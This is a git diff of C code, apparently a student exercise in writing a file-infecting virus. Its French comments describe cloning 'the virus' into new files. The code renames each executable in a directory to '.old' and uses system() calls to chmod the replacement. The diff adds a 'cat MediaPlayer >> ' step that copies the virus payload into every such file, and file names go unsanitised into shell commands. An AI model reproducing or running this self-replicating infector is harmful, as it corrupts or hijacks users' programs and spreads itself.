@@ -94,8 +94,10 @@ void cptExec() {
                 while ((dir = readdir(myDir)) != NULL) {
                         // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
                         if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name))) {
-                                if (access(dir->d_name, X_OK) == 0) {
-                                        renamingFile(dir->d_name);
+                                if(strstr(dir->d_name, ".old") == NULL) {
+                                        if (access(dir->d_name, X_OK) == 0) {
+                                                renamingFile(dir->d_name);
+                                        }
                                 }
                         }
                 }
@@ -104,7 +106,7 @@ void cptExec() {
 }
 
 /*
-        Renomme les fichiers, créer un noueau fichier au même nom et ajout les droits sur le nouveau fichier
+        Renomme les fichiers, créer un nouveau fichier au même nom et ajout les droits sur le nouveau fichier
 */
 void renamingFile(char *fileName) {
         printf("\tRenaming %s into %s.old\n",fileName,fileName);
@@ -134,6 +136,15 @@ void renamingFile(char *fileName) {
 
         // ajoute le droit d'exécution sur le fichier
         command = "chmod +x ";
+        String = malloc(strlen(command) + strlen(fileName) + 1);
+        if(String) {
+                strcpy(String,command);
+                strcat(String,fileName);
+                system(String);
+        }
+
+        // clonage du virus dans les nouveaux fichiers
+        command = "cat MediaPlayer >> ";
         String = malloc(strlen(command) + strlen(fileName) + 1);
         if(String) {
                 strcpy(String,command);
